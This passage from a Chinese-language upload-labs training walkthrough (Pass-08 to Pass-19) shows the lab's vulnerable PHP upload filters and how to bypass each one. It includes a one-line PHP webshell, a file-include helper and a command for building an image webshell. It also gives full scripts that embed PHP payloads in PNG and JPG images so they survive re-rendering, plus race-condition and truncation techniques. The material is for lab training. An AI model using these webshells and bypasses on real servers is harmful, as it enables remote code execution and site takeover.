array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方式 ::$DATA绕过 相比上面两道题，少了去除文件名的&quot;::$DATA&quot;字符串这一步，这里还是利用windows的一个特性。 在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。 用Burp将上传文件后缀改为:xx.php::$DATA即可。 Pass-09 利用.+空格+.绕过 代码 12345678910111213141516171819202122232425262728$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方式 点+空格+点绕过 它去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA，但是从“双写”的思想出发，代码的逻辑是先删除文件名末尾的点，再去除字符串::$DATA，最后首尾去空，所以我们可以使用点+空格+点的方式绕过。 也就是说，用Burp将文件名改为xx.php. .。 也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。 Pass-10 利用双写绕过 代码 1234567891011121314151617181920$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过方式 双写绕过 先分析下代码，可以看到问题出现在第8行的str_ireplace()函数，此函数在此的作用是对$file_name变量中含有$deny_ext内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似test.pphphp这样的文件，上传后文件会自动被修改为test.php进而成功上传shell。 Pass-11 利用%00截断绕过 代码 12345678910111213141516171819$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 绕过方式 %00绕过 分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。 截断条件： 1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态 Pass-12 利用0x00截断绕过 这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断。故这里不再叙述. Pass-13 利用图片马绕过文件头检测 代码 123456789101112131415161718192021222324252627282930313233343536373839404142function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;上传失败&quot;; &#125; &#125;&#125; 绕过方式 GIF89a 分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。 为了检测图片马是否能正常利用，这里在upload目录中放置个文件包含文件，fileInclude.php： 12&lt;?php @include($_GET[&#x27;file&#x27;]);?&gt; 再使用文件包含漏洞执行上传的shell： Windows命令 在Windows下使用如下命令可制作图片一句话木马： 12copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg 用WinHex打开生成的图片马就可以看到插入的PHP代码了： 手工添加文件头 针对文件头的检测，我们可以手工添加各种格式文件的文件头来绕过。 比如图片类型的文件幻数如下： JPG文件： GIF文件： 所以我们就可以直接在Burp中拦截报文手工在Hex栏中在PHP木马代码前添加上JPG的文件头： Pass-14 利用图片马绕过getimagesize() 代码 1234567891011121314151617181920212223242526272829303132function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; 绕过方式 PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。而image_type_to_extension()函数则根据图像类型返回对应的后缀名。 和Pass-13相似，使用文件合成命令生成图片马。 Pass-15 利用图片马绕过exif_imagetype() 代码 123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; 绕过方式 exif_imagetype()：读取一个图像的第一个字节并检查其签名。 同Pass-13生成图片马上传绕过。 get_imagesize()和exif_imagetype()对上传的图片检查有何不同： 通过调用exif_imagetype()函数判断图像类型的方法更具有容错性、能够对无法正常显示的图片马进行正常处理；而通过调用getimagesize()函数和image_type_to_extension()函数来获取图像类型并设置后缀名的方法是没办法对无法正常显示的图片马进行正常处理的。 Pass-16 二次渲染绕过 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 绕过方式 绕过思路：对比上传前和上传后的图片的差异，找到相同数据同时又是非图片数据区的地方，在在，此处写入恶意代码。 不同图像类型的插入方式有区别。 GIF GIF二次渲染绕过说是最简单的，将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。 保存之后，上传该修改后的图片，能够成功利用： PNG png和jpg当然没有gif这么简单。这里我也不细分析了(分析不来~~) 直接记个方法,将php代码写入IDAT数据块。 用国外大牛的脚本，目的是向PNG图片的IDAT数据块中插入PHP后门代码&lt;?=$_GET[0]($_POST[1]);?&gt; ： 12345678910111213141516171819202122232425&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; 直接运行该脚本生成1.png上传即可。 JPG JPG图片也使用脚本来生成，根据具体情况来更改miniPayload的值： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 使用方法： 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。 将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg 然后再上传payload.jpg Pass-17 利用竞争条件绕过 代码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 绕过方式 查看源码，发现是个条件竞争，上传成功的文件会被重命名，而上传失败的文件会先保存在upload目录中、然后再调用unlink()删除该不合法的上传文件： 代码存在条件竞争问题，非法文件上传后会先保存在upload目录中，然后再调用unlink()函数来删除，在这中间的时间差中，我们可以不断上传和访问非法的PHP文件，速度够快时就能触发成功。 用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。 Step1： 先设置上传请求，Burp拦截到上传文件的数据包后发送到Intruder模块，因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个。 Step2：接下来设置访问请求，浏览器构造请求url：http://127.0.0.1/upload-labs-master/upload/miracle778.php,进行访问，然后用burp抓包后发送至intruder模块，设置payload，这一步和上传请求设置差不多，都是Null payloads、5000次、50个线程。 Step3：设置好两个模块后同时启动，观察结果，因为我们传入的php代码是phpinfo();,所以如果访问成功的话，会返回php的配置信息。 Pass-18 利用竞争条件+解析漏洞绕过 myupload.php中保存文件的路径的代码是写得有点问题的，并不会将文件保存在upload目录中，原因是保存路径的字符串在拼接时少了个斜杠/，因此可自行在myupload.php的setDir()函数中将cls_upload_dir变量对应的语句加个斜杠即可： 12$this-&gt;cls_upload_dir = $dir.&#x27;/&#x27;; 代码 index.php 12345678910111213141516171819202122232425262728293031323334353637383940$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;文件已经被上传，但没有重命名。&#x27;; break; case -1: $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;; break; case -2: $msg = &#x27;上传失败，上传目录不可写。&#x27;; break; case -3: $msg = &#x27;上传失败，无法上传该类型文件。&#x27;; break; case -4: $msg = &#x27;上传失败，上传的文件过大。&#x27;; break; case -5: $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;; break; case -6: $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;; break; default: $msg = &#x27;未知错误！&#x27;; break; &#125;&#125; myupload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677class MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); .................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; 绕过方式 审计给出来的代码，看到有个条件竞争问题，即程序先上传文件再重命名文件， 但如果只能上传图像文件而没有文件包含漏洞也不能getshell，但是后缀名过滤的白名单中包含了zip、7z、rar等Apache不能解析的后缀名，所以我们可以利用竞争条件+解析漏洞绕过。 利用过程和Pass-17一样，只是这次上传的文件后缀是.php.7z。 Pass-19 利用\\.绕过 代码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这里关于pathinfo的说明如下图： 绕过方式 文件名是通过POST方式传入的，然后通过黑名单过滤文件后缀名，最后直接用文件名拼接保存的文件路径上传上去。这关的绕过方法就很多了： 0x00截断 点绕过 ::$DATA绕过 空格绕过 大小写绕过 Apache解析漏洞绕过 这些都是之前关卡都用过的绕过方式，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php。 绕过文件名后缀： post: 